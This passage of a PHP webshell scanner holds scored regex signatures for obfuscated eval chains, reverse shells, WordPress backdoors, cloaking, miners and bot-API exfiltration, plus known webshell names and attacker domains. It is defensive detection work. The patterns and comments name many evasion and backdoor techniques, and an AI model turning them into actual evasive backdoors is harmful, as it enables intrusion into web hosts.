            ['score' => 70, 'sig' => 'func_concat', 'pat' => '/\$\w+\s*=\s*[\'"][a-z_]{1,4}[\'"]\s*\.\s*[\'"][a-z_]{1,4}[\'"]\s*\.\s*[\'"][a-z_]{1,6}[\'"].{0,100}eval\s*\(/si'],
            ['score' => 80, 'sig' => 'func_concat_exec', 'pat' => '/\$\w+\s*=\s*[\'"](?:sys|she|pas|exe|ass|ev)[\'"].*?\$\w+\s*\(/si'],
            // Password-gated shells — md5 hash check + POST/COOKIE at file start
            ['score' => 70, 'sig' => 'password_gate', 'pat' => '/\bmd5\s*\(\s*\$_(POST|GET|REQUEST|COOKIE)\[.{0,50}\]\s*\)\s*[=!]{2,3}\s*[\'"][a-f0-9]{32}[\'"]/i'],
            ['score' => 70, 'sig' => 'password_gate_verify', 'pat' => '/password_verify\s*\(\s*\$_(POST|GET|REQUEST|COOKIE)/i'],
            // Kurtlar/Turkish backdoor patterns (from playbook)
            ['score' => 100, 'sig' => 'kurtlar', 'pat' => '/kurtlar|s4ndal|DrunkShell/i'],
            ['score' => 100, 'sig' => 'msfacai', 'pat' => '/msfacai|KEMBANGTOTO|rocamarc\.com/i'],
            ['score' => 100, 'sig' => 'c2_domains_ext', 'pat' => '/qris-pwn\.pages\.dev|examples2\.pages\.dev|alfaracing\.pages\.dev|forelpe\.xyz/i'],
            // Self-delete pattern — cleanup after execution
            ['score' => 80, 'sig' => 'self_delete', 'pat' => '/\$_GET\[.{0,20}\].*@?unlink\s*\(\s*__FILE__\s*\)/si'],
            // ZIP/PHAR stream include from image — %PDF<?php include("zip://./sn.jpg#sn.txt")
            ['score' => 100, 'sig' => 'zip_spoof', 'pat' => '/include\s*\(\s*[\'"]zip:\/\//i'],
            // Custom decompressor functions (like Qo()) — small function + large encoded blob
            ['score' => 60, 'sig' => 'custom_decompress', 'pat' => '/function\s+[A-Z][a-z]\s*\(\s*\$\w+\s*\).{0,300}ord\s*\(.{0,100}chr\s*\(/si'],
            // Hex-encoded function array (DrunkShell pattern — \x escape syntax)
            ['score' => 70, 'sig' => 'hex_func_array', 'pat' => '/\$\w+\s*=\s*array\s*\(\s*[\'"]\\\\x[0-9a-f]{2}/i'],
            // Plain hex string array — tiap item baris sendiri dengan inline comment (Gecko pattern)
            // Match: '676574637764', # ge  tcw d => 0
            ['score' => 80, 'sig' => 'plain_hex_func_array', 'pat' => '/[\'"][0-9a-f]{6,22}[\'"]\s*,\s*#\s*\w/i'],
            // chr(hexdec(...)) decoder — teknik Gecko unx() untuk decode nama fungsi dari hex string
            ['score' => 90, 'sig' => 'chr_hexdec_decode', 'pat' => '/chr\s*\(\s*hexdec\s*\(/i'],
            // Array index callable dengan user input — $fungsi[16]($cmd) setelah decode hex
            ['score' => 80, 'sig' => 'array_idx_callable', 'pat' => '/\$\w+\s*\[\s*\d+\s*\]\s*\(\s*(?:[^;)]*\$_(GET|POST|REQUEST|COOKIE|SERVER)|[^;)]*\$\w+\s*[,\)])/i'],
            // $_SERVER key di-hex-escape dengan <20 pair ("\x53\x45\x52...") — Gecko pattern
            ['score' => 70, 'sig' => 'server_hex_key', 'pat' => '/\$_SERVER\s*\[\s*"(?:\\\\x[0-9a-fA-F]{2}){6,}"/i'],
            // Gecko shell IOC — MadExploits brand + pwnkit privilege escalation tool
            ['score' => 100, 'sig' => 'gecko_shell', 'pat' => '/MadExploits|gecko-upload|gecko-bc|gecko-select|pwnkit|Privelege-escalation/i'],
            // SEO cloaking management panel — cloak_state.json state file or seofile upload handler
            ['score' => 150, 'sig' => 'seo_cloak_panel', 'pat' => '/cloak_state\.json|\$_FILES\s*\[.{0,30}seofile/si'],
            // Hex-only key auth without md5 — $AUTH='4375d80d263c7d59'; + $_REQUEST check
            ['score' => 90, 'sig' => 'hex_key_auth', 'pat' => '/\$\w{2,10}\s*=\s*[\'"][0-9a-f]{12,32}[\'"]\s*;.{0,200}\$_(REQUEST|GET|POST|COOKIE)\s*\[/si'],
            // detect_root() function — signature of SEO cloaking tools that probe WP/Joomla root
            ['score' => 100, 'sig' => 'detect_root_func', 'pat' => '/function\s+detect_root\s*\(\)/i'],
            // Hidden div backlink spam — position off-screen trick, invisible to users but read by bots
            ['score' => 150, 'sig' => 'hidden_div_spam', 'pat' => '/left\s*:\s*-\d{4,}px/i'],
            // register_shutdown_function closure — stealth execution after page render
            ['score' => 40, 'sig' => 'shutdown_injector', 'pat' => '/register_shutdown_function\s*\(\s*function/i'],
            // Dynamic variable function — $$var() or ${$var}()
            ['score' => 60, 'sig' => 'dynamic_var_func', 'pat' => '/\$\{\s*\$\w+\s*\}\s*\(|\$\$\w+\s*\(/'],
            // geturlsinfo pattern (from playbook)
            ['score' => 80, 'sig' => 'url_fetcher_shell', 'pat' => '/function\s+geturlsinfo\s*\(/i'],
            // Obfuscated string via chr() chains (5+ chr calls = suspicious)
            ['score' => 70, 'sig' => 'chr_chain_long', 'pat' => '/(?:chr\s*\(\d+\)\s*\.?\s*){5,}/i'],
            // eval of reversed/ROT13 function name — eval(strrev('edoced_46esab')(...))
            ['score' => 100, 'sig' => 'eval_strrev', 'pat' => '/eval\s*\(\s*strrev\s*\(/i'],
            ['score' => 100, 'sig' => 'eval_rot13_call', 'pat' => '/eval\s*\(\s*str_rot13\s*\(/i'],
            // Closure/anonymous function with dangerous body
            ['score' => 80, 'sig' => 'closure_rce', 'pat' => '/function\s*\(\s*\$\w*\s*\)\s*\{\s*(system|exec|passthru|shell_exec|eval)\s*\(/i'],
            // WP hidden user injection — add_action('pre_user_query') to hide users
            ['score' => 100, 'sig' => 'wp_hide_user', 'pat' => '/pre_user_query.{0,300}query_where/si'],
            // WP auto-create admin on every request
            ['score' => 100, 'sig' => 'wp_auto_admin', 'pat' => '/wp_create_user.{0,300}set_role.{0,100}administrator/si'],
            // WP auto-login backdoor — wp_set_auth_cookie triggered by GET/POST/REQUEST input
            ['score' => 100, 'sig' => 'wp_auth_cookie_input', 'pat' => '/\$_(GET|POST|REQUEST|COOKIE).{0,800}wp_set_auth_cookie/si'],
            ['score' => 100, 'sig' => 'wp_auth_cookie_hook', 'pat' => '/add_action\s*\(.{0,80}(init|wp_loaded|plugins_loaded|template_redirect).{0,800}wp_set_auth_cookie/si'],
            // String interpolation RCE — "${system($_GET[0])}" or "${${'system'}(...)}"
            ['score' => 100, 'sig' => 'interpolation_rce', 'pat' => '/"\$\{.{0,30}(system|exec|passthru|shell_exec|eval)\s*\(/i'],
            // set_error_handler abuse — set_error_handler('system'); trigger_error($_GET)
            ['score' => 100, 'sig' => 'error_handler_rce', 'pat' => '/set_error_handler\s*\(\s*[\'"](system|exec|passthru|shell_exec|eval)[\'"]/i'],
            // ReflectionFunction RCE
            ['score' => 100, 'sig' => 'reflection_rce', 'pat' => '/ReflectionFunction\s*\(\s*[\'"](system|exec|passthru|shell_exec|eval)[\'"]/i'],
            // FFI abuse (PHP 7.4+)
            ['score' => 100, 'sig' => 'ffi_rce', 'pat' => '/FFI\s*::\s*cdef\s*\(/i'],
            // mail() -X log injection
            ['score' => 80, 'sig' => 'mail_log_inject', 'pat' => '/\bmail\s*\(.{0,200}-X\s/si'],
            // pcntl_exec direct execution
            ['score' => 90, 'sig' => 'pcntl_exec', 'pat' => '/\bpcntl_exec\s*\(\s*[\'"\/]/i'],
            // dl() extension loading
            ['score' => 80, 'sig' => 'dl_load', 'pat' => '/(?<![_a-z])dl\s*\(\s*[\'"]/i'],
            // php://filter wrapper — often used for LFI chains
            ['score' => 70, 'sig' => 'php_filter', 'pat' => '/php:\/\/filter\/.*convert\.(base64|iconv)/i'],
            // file_put_contents to PHP file — drop shell
            ['score' => 70, 'sig' => 'file_write_php', 'pat' => '/file_put_contents\s*\(\s*\$_(GET|POST|REQUEST|COOKIE).{0,100}\.php/si'],
            ['score' => 80, 'sig' => 'file_write_eval', 'pat' => '/file_put_contents\s*\(.{0,200}<\?php/si'],
            // ini_set error_log to write webshell
            ['score' => 80, 'sig' => 'ini_error_log', 'pat' => '/ini_set\s*\(\s*[\'"]error_log[\'"]\s*,.{0,100}\.php/i'],
            // unserialize() with user input — deserialization attack
            ['score' => 70, 'sig' => 'unserialize_input', 'pat' => '/\bunserialize\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/i'],
            // Array of single chars reassembled — common obfuscation
            ['score' => 60, 'sig' => 'char_array_build', 'pat' => '/\$\w+\s*=\s*array\s*\(\s*[\'"][a-z][\'"]\s*,\s*[\'"][a-z][\'"]\s*,\s*[\'"][a-z][\'"]\s*,\s*[\'"][a-z][\'"]\s*,\s*[\'"][a-z][\'"]\s*,\s*[\'"][a-z][\'"].*implode/si'],
            // Long hex string (100+ hex chars) — obfuscated payload
            ['score' => 50, 'sig' => 'long_hex_string', 'pat' => '/[\'"](?:\\\\x[0-9a-fA-F]{2}){20,}[\'"]/'],
            // Compact variable extraction abuse
            ['score' => 70, 'sig' => 'compact_extract', 'pat' => '/extract\s*\(\s*compact\s*\(/i'],
            // session_start + $_SESSION eval/include — session-based shell
            ['score' => 70, 'sig' => 'session_shell', 'pat' => '/\$_SESSION\s*\[.{0,50}\]\s*=.{0,200}eval\s*\(\s*\$_SESSION/si'],
            // Suspicious IOCs from real attacks
            ['score' => 100, 'sig' => 'ioc_c2_new', 'pat' => '/alfashell|indoxploit|FilesMan|Bypass[_ ]?Shell|Mini[_ ]?Shell|WSO[_ ]?\d/i'],
            ['score' => 100, 'sig' => 'ioc_webshell_brand', 'pat' => '/Leaf[_ ]?Shell|Sadrazam|Ghost[_ ]?Shell|Marijuana[_ ]?Shell|AnonGhost|Mr\.?Nobody/i'],
            // Encoded GET/POST parameter names (1-2 char param + eval/system)
            ['score' => 70, 'sig' => 'short_param_rce', 'pat' => '/\$_(GET|POST|REQUEST)\s*\[\s*[\'"][a-z0-9]{1,2}[\'"]\s*\].{0,50}(eval|system|exec|passthru|shell_exec)\s*\(/si'],
            ['score' => 70, 'sig' => 'short_param_rce2', 'pat' => '/(eval|system|exec|passthru|shell_exec)\s*\(\s*\$_(GET|POST|REQUEST)\s*\[\s*[\'"][a-z0-9]{1,2}[\'"]\s*\]/i'],
            // Obfuscated variable name patterns — $_ $__ $___ $____ or $GLOBALS[chr()]
            ['score' => 50, 'sig' => 'underscore_vars', 'pat' => '/\$_{2,5}\s*[\[=\(]/'],
            // base64 in variable assignment + later eval (split pattern)
            ['score' => 50, 'sig' => 'b64_var_eval', 'pat' => '/\$\w+\s*=\s*[\'"][A-Za-z0-9+\/]{100,}={0,2}[\'"]/'],
            // LOADER: include/require file non-PHP — flag semua ext bukan php/phtml/html/inc
            ['score' => 100, 'sig' => 'include_nonphp_file', 'pat' => '/(?:include|require)(?:_once)?\s*[\(\s]*[\'"][^\'"\/\\\\]+\.(?!php[3-8]?[\'"\s]|phtml[\'"\s]|html?[\'"\s]|inc[\'"\s])[a-z0-9_-]{1,20}[\'"]/i'],
            // LOADER: include dari variabel user-controlled ($_ GET/POST/COOKIE/REQUEST)
            ['score' => 100, 'sig' => 'include_userinput', 'pat' => '/(?:include|require)(?:_once)?\s*\(\s*\$_(GET|POST|REQUEST|COOKIE|FILES)\s*\[/i'],
            // LOADER: ZIP/PHAR stream wrapper untuk load payload dari file gambar/zip
            ['score' => 100, 'sig' => 'stream_wrapper_loader', 'pat' => '/(?:include|require|file_get_contents|fopen)\s*\(\s*[\'"](?:zip|phar|glob|data):\/\//i'],
            // LOADER: include dari $var setelah assign dari upload/fetch
            ['score' => 80, 'sig' => 'include_fetched_var', 'pat' => '/(?:move_uploaded_file|file_put_contents|copy).{0,300}(?:include|require)\s*\(\s*\$/si'],

            // HIGH (score 60 — langsung flag)
            ['score' => 60, 'sig' => 'chained_encode', 'pat' => '/(gzinflate|gzdeflate|str_rot13|base64_decode).{0,40}(gzinflate|gzdeflate|str_rot13|base64_decode)/i'],
            ['score' => 60, 'sig' => 'eval_hex', 'pat' => '/eval\s*\([^;]{0,80}\\\\x[0-9a-fA-F]{2}/i'],
            ['score' => 60, 'sig' => 'goto_eval', 'pat' => '/goto\s+\w+;.{0,300}eval\s*\(/si'],
            // 4+ goto labels = pasti obfuscator, bukan kode normal
            ['score' => 80, 'sig' => 'goto_multi', 'pat' => '/(?:goto\s+\w+\s*;.*?){4,}/si'],
            // Campur hex \xNN dan oktal \NNN dalam satu string — trik goto obfuscator
            ['score' => 70, 'sig' => 'mixed_hex_oct', 'pat' => '/\\\\x[0-9a-fA-F]{2}\\\\[0-9]{2,3}|\\\\[0-9]{2,3}\\\\x[0-9a-fA-F]{2}/'],
            // curl_exec → eval via variabel (goto obfuscator pattern)
            ['score' => 80, 'sig' => 'curl_eval_chain', 'pat' => '/curl_exec\s*\(.{0,800}eval\s*\(/si'],
            // curl/file_get_contents langsung di-eval via string concat
            ['score' => 80, 'sig' => 'eval_concat_rce', 'pat' => '/eval\s*\(\s*[\'"][?<\/]{0,3}[\'"\s]*\.\s*\$\w+/i'],
            ['score' => 60, 'sig' => 'chr_obfusc', 'pat' => '/chr\s*\(\d+\)\s*\.\s*chr\s*\(\d+\)\s*\.\s*chr\s*\(\d+\)/i'],
            ['score' => 60, 'sig' => 'globals_obfusc', 'pat' => '/\$\{[\'"]GLOBALS[\'"]\}\s*\[/i'],
            ['score' => 60, 'sig' => 'var_func_split', 'pat' => '/\$\w+\s*=\s*[\'"]ev[\'"][^;]{0,30}[\'"]al[\'"]/i'],
            // MEDIUM — kombinasi menaikkan score ke >= 100
            ['score' => 40, 'sig' => 'has_eval', 'pat' => '/\beval\s*\(/i'],
            ['score' => 40, 'sig' => 'has_base64', 'pat' => '/\bbase64_decode\s*\(/i'],
            ['score' => 40, 'sig' => 'has_gzip', 'pat' => '/\bgzinflate\s*\(|\bgzdeflate\s*\(/i'],
            ['score' => 30, 'sig' => 'has_system_fn', 'pat' => '/\b(system|passthru|shell_exec|exec|popen)\s*\(/i'],
            ['score' => 30, 'sig' => 'has_cookie_input', 'pat' => '/\$_(GET|POST|REQUEST|COOKIE)\s*\[/i'],
            ['score' => 20, 'sig' => 'has_str_obfusc', 'pat' => '/\bstr_rot13\s*\(|\bstrrev\s*\(/i'],
            ['score' => 20, 'sig' => 'has_phar', 'pat' => '/\bPhar\b|\bphar\b/i'],
            ['score' => 20, 'sig' => 'has_goto', 'pat' => '/\bgoto\s+\w+/i'],

            // ── NEW: Additional evasion techniques ──
            // Hex-escaped eval — eval("\x73\x79\x73\x74\x65\x6d") bypasses string matching
            ['score' => 90, 'sig' => 'hex_eval_bypass', 'pat' => '/eval\s*\(\s*"\\\\x[0-9a-f]{2}(?:\\\\x[0-9a-f]{2}){3,}"/i'],
            // Variable variable function call — $$fn() or ${$fn}()
            ['score' => 70, 'sig' => 'varvar_call', 'pat' => '/\$\$\w+\s*\(|\$\{\s*\$\w+\s*\}\s*\(/'],
            // Null byte injection — actual null byte before PHP tag (binary polyglot)
            ['score' => 100, 'sig' => 'null_byte', 'pat' => '/\x00.{0,50}<\?php/s'],
            // Class::__construct with eval/system — OOP backdoor
            ['score' => 80, 'sig' => 'oop_backdoor', 'pat' => '/function\s+__construct\s*\([^)]*\).{0,300}(eval|system|exec|passthru|shell_exec)\s*\(/si'],
            // Class with __destruct + eval — deserialization attack vector
            ['score' => 80, 'sig' => 'destruct_rce', 'pat' => '/function\s+__destruct\s*\(\s*\).{0,500}(eval|system|exec|passthru|shell_exec|file_put_contents)\s*\(/si'],
            // Class with __wakeup + eval — deserialization gadget
            ['score' => 80, 'sig' => 'wakeup_rce', 'pat' => '/function\s+__wakeup\s*\(\s*\).{0,500}(eval|system|exec|passthru|shell_exec)\s*\(/si'],
            // header() redirect to phishing/malware — open redirect backdoor
            ['score' => 60, 'sig' => 'header_redirect_inject', 'pat' => '/header\s*\(\s*[\'"]Location:\s*[\'"]\s*\.\s*\$_(GET|POST|REQUEST)/i'],
            // WordPress add_action/add_filter with eval
            ['score' => 100, 'sig' => 'wp_hook_eval', 'pat' => '/add_(action|filter)\s*\(.{0,100}eval\s*\(\s*(base64_decode|gzinflate|str_rot13)/si'],
            // WordPress wp_options injection via update_option with encoded payload
            ['score' => 90, 'sig' => 'wp_option_inject', 'pat' => '/update_option\s*\(.{0,100}base64_decode/si'],
            // Reverse shell pattern — fsockopen + exec/shell_exec
            ['score' => 100, 'sig' => 'reverse_shell', 'pat' => '/fsockopen\s*\(.{0,300}(exec|system|passthru|shell_exec|popen)\s*\(/si'],
            // Socket-based backdoor — socket_create + socket_connect
            ['score' => 90, 'sig' => 'socket_backdoor', 'pat' => '/socket_create\s*\(.{0,500}socket_connect/si'],
            // proc_open with shell — proc_open('/bin/sh' or 'cmd.exe')
            ['score' => 90, 'sig' => 'proc_open_shell', 'pat' => '/proc_open\s*\(\s*[\'"](\/bin\/(ba)?sh|cmd(\.exe)?|powershell)/i'],
            // Double-extension trick — file.php.jpg, file.php.png, etc.
            ['score' => 80, 'sig' => 'double_ext', 'pat' => '/\.php\d?\.(jpg|jpeg|png|gif|ico|css|js|svg|txt|html?)$/i'],
            // Telegram/Discord exfil — curl to bot API
            ['score' => 70, 'sig' => 'data_exfil_bot', 'pat' => '/api\.telegram\.org\/bot|discord(app)?\.com\/api\/webhooks/i'],
            // Cryptocurrency miner indicators
            ['score' => 100, 'sig' => 'crypto_miner', 'pat' => '/coinhive|cryptonight|stratum\+tcp|xmrig|minergate/i'],
            // Reverse double extension — file.ico.php, file.jpg.php
            ['score' => 90, 'sig' => 'double_ext_reverse', 'pat' => '/\.(ico|jpg|jpeg|png|gif|bmp|svg)\.php$/i'],
            // ── Synced from stream scan ──
            ['score' => 100, 'sig' => 'eval_hex2bin', 'pat' => '/eval\s*\(\s*hex2bin\s*\(/i'],
            ['score' => 90, 'sig' => 'proc_open_rce', 'pat' => '/proc_open\s*\(.{0,200}\$_(GET|POST|REQUEST|COOKIE)/si'],
            ['score' => 100, 'sig' => 'socket_shell', 'pat' => '/fsockopen\s*\(.{0,200}(fwrite|fputs).{0,200}\$_(GET|POST|REQUEST|COOKIE)/si'],
            ['score' => 70, 'sig' => 'varvar_exec', 'pat' => '/\$\$\w+\s*\(\s*\$\$\w+/'],
            ['score' => 100, 'sig' => 'b64_gz_combo', 'pat' => '/base64_decode\s*\(\s*[\'"][A-Za-z0-9+\/]{50,}.*gzinflate/si'],
            ['score' => 80, 'sig' => 'error_off_eval', 'pat' => '/error_reporting\s*\(\s*0\s*\).{0,500}eval\s*\(/si'],
            ['score' => 60, 'sig' => 'single_line_obfusc', 'pat' => '/^<\?php\s+\S{5000,}/s'],
            ['score' => 90, 'sig' => 'wpconfig_inject', 'pat' => '/require_once\s*\(\s*ABSPATH\s*\.\s*[\'"]wp-settings\.php[\'"]\s*\).{1,500}(eval|base64_decode|system|include)/si'],
            ['score' => 80, 'sig' => 'curl_drop_shell', 'pat' => '/curl_exec\s*\(.{0,500}file_put_contents/si'],
            ['score' => 90, 'sig' => 'hex_decode_eval', 'pat' => '/hex2bin\s*\(.{0,200}eval/si'],
            ['score' => 80, 'sig' => 'htaccess_write', 'pat' => '/file_put_contents\s*\(.{0,100}\.htaccess/si'],
            ['score' => 70, 'sig' => 'array_chr_build', 'pat' => '/array_map\s*\(\s*[\'"]chr[\'"]\s*,.{0,200}(eval|assert)/si'],
            ['score' => 90, 'sig' => 'gif_header_shell', 'pat' => '/^GIF89a.{0,50}<\?php/si'],
            ['score' => 90, 'sig' => 'exif_header_shell', 'pat' => '/^\xFF\xD8\xFF.{0,100}<\?php/si'],
            ['score' => 100, 'sig' => 'socket_revshell', 'pat' => '/\bfsockopen\s*\(.{0,500}(shell_exec|passthru|system|exec|popen)\s*\(/si'],
            ['score' => 100, 'sig' => 'wp_option_backdoor', 'pat' => '/update_option\s*\(.{0,100}(eval|base64_decode|system|exec)/si'],
            // ── Char-by-char string concat to build function names ──
            // $a='f'.'i'.'l'.'e'.'_'.'p'.'u'.'t' — 6+ single-char concat = obfuscation
            ['score' => 80, 'sig' => 'char_concat_func', 'pat' => '/\$\w+\s*=\s*[\'"][a-z_][\'"]\s*\.\s*[\'"][a-z_][\'"]\s*\.\s*[\'"][a-z_][\'"]\s*\.\s*[\'"][a-z_][\'"]\s*\.\s*[\'"][a-z_][\'"]\s*\.\s*[\'"][a-z_][\'"]/',],
            // $_FILES upload + variable function call — uploader shell
            ['score' => 90, 'sig' => 'var_func_upload', 'pat' => '/\$\w+\s*\(\s*\$_FILES\s*\[/i'],
            // Variable function call with $_GET/$_POST args — $func($_POST['x'])
            ['score' => 80, 'sig' => 'var_func_userinput', 'pat' => '/\$\w+\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)\s*\[/i'],
            // GIF89a + form upload + PHP code = uploader shell disguised as image
            ['score' => 100, 'sig' => 'gif_uploader_shell', 'pat' => '/GIF89a.{0,500}<form.{0,300}(move_uploaded_file|\$_FILES|file_put_contents)/si'],
            // Contact/SEO spam shell — <meta noindex + form upload + PHP exec
            ['score' => 90, 'sig' => 'seo_spam_shell', 'pat' => '/noindex.{0,200}<form.{0,500}\$_FILES/si'],

            // ── Command wrapper / disable_functions bypass ──
            // ini_get('disable_functions') + exec call — classic disable_functions evasion wrapper
            ['score' => 90, 'sig' => 'disable_fn_bypass', 'pat' => '/ini_get\s*\(\s*[\'"]disable_functions[\'"]\s*\).{0,500}(proc_open|shell_exec|exec|system|passthru|popen)\s*\(/si'],
            // proc_open + stream_get_contents — piped I/O pattern, hanya ada di shell/RCE wrapper
            ['score' => 80, 'sig' => 'proc_open_pipe_io', 'pat' => '/proc_open\s*\(.{0,300}stream_get_contents\s*\(/si'],
            // foreach(['shell_exec','exec','system'...]) — iterates exec fns to find one not disabled
            ['score' => 80, 'sig' => 'multi_exec_fallback', 'pat' => '/foreach\s*\(\s*\[.{0,200}[\'\"](shell_exec|exec|system|passthru|popen)[\'\"]/si'],

            // ── Advanced evasion techniques ──
            // base_convert to build function name — base_convert('1598504',10,36) = "system"
            ['score' => 90, 'sig' => 'base_convert_func', 'pat' => '/base_convert\s*\(\s*[\'"]?\d{4,}[\'"]?\s*,\s*\d+\s*,\s*36\s*\)/i'],
            // dechex/hex2bin to build function name — hex2bin('73797374656d') = "system"
            ['score' => 80, 'sig' => 'dechex_func_build', 'pat' => '/hex2bin\s*\(\s*[\'"][0-9a-f]{8,}[\'"]\s*\)/i'],
            // array_reverse + implode to build function name
            ['score' => 70, 'sig' => 'array_reverse_func', 'pat' => '/implode\s*\(.{0,20}array_reverse\s*\(/i'],
            // XOR string build — $a = "abc" ^ "def" to produce function name
            ['score' => 70, 'sig' => 'xor_string_build', 'pat' => '/\$\w+\s*=\s*[\'"][^"\']{3,20}[\'"]\s*\^\s*[\'"][^"\']{3,20}[\'"]/'],
            // str_split + array manipulation to build function name
            ['score' => 60, 'sig' => 'str_split_build', 'pat' => '/str_split\s*\(.{0,100}(implode|join)\s*\(/si'],
            // Variable from HTTP header — $$_SERVER['HTTP_X'] or extract from headers
            ['score' => 90, 'sig' => 'header_var_exec', 'pat' => '/\$\$_SERVER\s*\[\s*[\'"]HTTP_/i'],
            // $_SERVER HTTP header as function name or eval input
            ['score' => 80, 'sig' => 'header_func_call', 'pat' => '/\$_SERVER\s*\[\s*[\'"]HTTP_[A-Z_]+[\'"]\s*\]\s*\(/i'],
            // getallheaders() to get exec payload from HTTP headers
            ['score' => 80, 'sig' => 'getallheaders_exec', 'pat' => '/getallheaders\s*\(\s*\).{0,200}(eval|system|exec|assert|call_user_func)/si'],
            // pack() to build function name — pack('H*','73797374656d') = "system"
            ['score' => 80, 'sig' => 'pack_func_build', 'pat' => '/pack\s*\(\s*[\'"]H\*[\'"]\s*,.{0,200}(eval|\$\w+\s*\()/si'],
            // substr to extract function name from innocent-looking string
            ['score' => 60, 'sig' => 'substr_func_build', 'pat' => '/\$\w+\s*=\s*substr\s*\(.{0,100}\$\w+\s*\(/si'],
            // str_replace to build function — str_replace('x','','sxysxtxexm')
            ['score' => 70, 'sig' => 'str_replace_func', 'pat' => '/str_replace\s*\(\s*[\'"][^"\']{1,3}[\'"]\s*,\s*[\'"]{2}\s*,\s*[\'"][a-z_]{6,30}[\'"]\s*\)/i'],
            // preg_replace to extract/build function name
            ['score' => 70, 'sig' => 'preg_extract_func', 'pat' => '/preg_replace\s*\(.{0,100}[\'"]\s*,\s*[\'"]{2}\s*,\s*[\'"][^"\']{6,}[\'"]\s*\)/i'],
            // Unicode escape sequence — "\u{0073}\u{0079}\u{0073}" to build strings
            ['score' => 90, 'sig' => 'unicode_escape', 'pat' => '/\\\\u\{[0-9a-f]{4}\}.*\\\\u\{[0-9a-f]{4}\}.*\\\\u\{[0-9a-f]{4}\}/i'],
            // Octal string — "\163\171\163\164\145\155" = "system"
            ['score' => 80, 'sig' => 'octal_string_func', 'pat' => '/"(?:\\\\[0-9]{2,3}){5,}"/'],
            // compact() + extract() combo — smuggle variables
            ['score' => 70, 'sig' => 'compact_smuggle', 'pat' => '/compact\s*\(.{0,200}extract\s*\(/si'],
            // Very long single variable assignment (>500 chars of base64/hex = payload)
            ['score' => 60, 'sig' => 'long_payload_var', 'pat' => '/\$\w+\s*=\s*[\'"][A-Za-z0-9+\/\\\\x]{500,}/s'],
            // register_tick_function — sneaky exec on every tick
            ['score' => 90, 'sig' => 'tick_func_exec', 'pat' => '/register_tick_function\s*\(\s*[\'"](system|exec|passthru|shell_exec|eval)[\'"]/i'],
            // array_walk_recursive with dangerous callback
            ['score' => 90, 'sig' => 'walk_recursive_rce', 'pat' => '/array_walk_recursive\s*\(.{0,100}[\'"](system|exec|passthru|shell_exec|assert)[\'"]/i'],
            // create_function (deprecated but still works) with user input
            ['score' => 100, 'sig' => 'create_func_input', 'pat' => '/create_function\s*\(.{0,100}\$_(GET|POST|REQUEST|COOKIE)/si'],
            // Nested function call chain — $a($b($c($_POST['x'])))
            ['score' => 70, 'sig' => 'nested_var_call', 'pat' => '/\$\w+\s*\(\s*\$\w+\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/i'],
            // PHP closing tag trick — hide code between closing/opening tags
            ['score' => 70, 'sig' => 'closing_tag_hide', 'pat' => '/\x3f\x3e\s*<\x3f(php)?\s*(eval|system|exec|passthru|shell_exec|base64_decode)\s*\(/si'],
            // ── PHP-based cloaking detection ──
            // Bot UA list in PHP — array of bot names for cloaking decision
            ['score' => 90, 'sig' => 'php_bot_ua_list', 'pat' => '/googlebot.{0,50}bingbot.{0,50}(yandexbot|baiduspider|slurp|duckduckbot|facebookexternalhit)/si'],
            // HTTP_USER_AGENT check + bot names — cloaking decision logic
            ['score' => 80, 'sig' => 'ua_bot_check', 'pat' => '/HTTP_USER_AGENT.{0,200}(googlebot|bingbot|yandexbot|spider|crawl)/si'],
            // preg_match on User-Agent with bot list — common cloaking pattern
            ['score' => 80, 'sig' => 'ua_preg_bot', 'pat' => '/preg_match\s*\(.{0,100}(googlebot|bingbot|bot|spider|crawl).{0,100}HTTP_USER_AGENT/si'],
            // Redirect based on bot detection — header('Location:') after bot check
            ['score' => 90, 'sig' => 'bot_redirect_cloak', 'pat' => '/(googlebot|bingbot|spider|crawl).{0,500}header\s*\(\s*[\'"]Location/si'],
            // file_get_contents/curl to external URL based on bot — serve different content
            ['score' => 90, 'sig' => 'bot_content_swap', 'pat' => '/(googlebot|bingbot|spider|crawl).{0,500}(file_get_contents|curl_exec|wp_remote_get)\s*\(/si'],
            // ── Missed detection fixes ──
            // eval(gzdecode(...)) — gzdecode (PHP 5.4+) was not covered, common evasion
            ['score' => 100, 'sig' => 'eval_gzdecode', 'pat' => '/eval\s*\(\s*@?gzdecode\s*\(/i'],
            // convert_uudecode — alternative encoding to bypass base64 scanners
            ['score' => 100, 'sig' => 'eval_uudecode', 'pat' => '/eval\s*\(\s*convert_uudecode\s*\(/i'],
            ['score' => 80, 'sig' => 'uudecode_payload', 'pat' => '/convert_uudecode\s*\(\s*[\'"][^\'"]{100,}/si'],
            // rawurldecode eval chain — eval(rawurldecode('%65%76%61%6c'))
            ['score' => 90, 'sig' => 'eval_rawurldecode', 'pat' => '/eval\s*\(\s*rawurldecode\s*\(/i'],
            // gzdecode alone (adds to combo score with has_eval etc.)
            ['score' => 40, 'sig' => 'has_gzdecode', 'pat' => '/\bgzdecode\s*\(/i'],
            // Chained decode without eval — multi-layer unwrap then include/require
            ['score' => 80, 'sig' => 'chained_decode_include', 'pat' => '/(gzinflate|gzdecode|gzuncompress|base64_decode)\s*\(.{0,300}(include|require)/si'],
            // WordPress wp-login.php / wp-config.php dropper — write malicious content into core files
            ['score' => 100, 'sig' => 'wp_core_dropper', 'pat' => '/file_put_contents\s*\(.{0,100}(wp-config|wp-login|wp-settings|wp-load)\.php/si'],
        ];
        $RISK_THRESHOLD = 100; // flag jika total score >= ini

        // Entropy helper: Shannon entropy, flag jika > 5.4 (base64 blob)
        $calcEntropy = function ($str) {
            $len = strlen($str);
            if ($len < 100)
                return 0;
            $freq = array_count_values(str_split($str));
            $e = 0.0;
            foreach ($freq as $cnt) {
                $p = $cnt / $len;
                $e -= $p * log($p, 2);
            }
            return $e;
        };
        // Ambil base64 blob panjang pertama saja; entropy full-file mahal untuk file normal.
        $findLargeB64Blob = function ($c) {
            return preg_match('/[A-Za-z0-9+\/]{500,}={0,2}/', $c, $m) ? $m[0] : '';
        };
        $found = [];
        $roots = [];
        $dd = "$home/domains";
        if (is_dir($dd)) {
            foreach (scandir($dd) as $d) {
                if ($d === '.' || $d === '..')
                    continue;
                foreach (['public_html', 'html', 'www', 'htdocs', 'web'] as $wr) {
                    $candidate = "$dd/$d/$wr";
                    if (is_dir($candidate)) {
                        $roots[$d] = $candidate;
                        break;
                    }
                }
            }
        }
        if (is_dir("$home/public_html")) {
